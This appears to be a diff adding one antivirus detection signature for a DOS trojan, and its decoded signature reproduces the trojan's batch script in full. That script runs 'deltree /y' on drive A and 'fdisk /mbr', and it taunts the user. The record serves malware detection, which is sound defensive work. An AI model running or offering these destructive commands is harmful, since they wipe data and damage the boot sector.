@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36584
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cls echo are you feeling placid? pause deltree /y a:\ fdisk /mbr echo the bell tolls for you! .... god, you must be an idiot. 
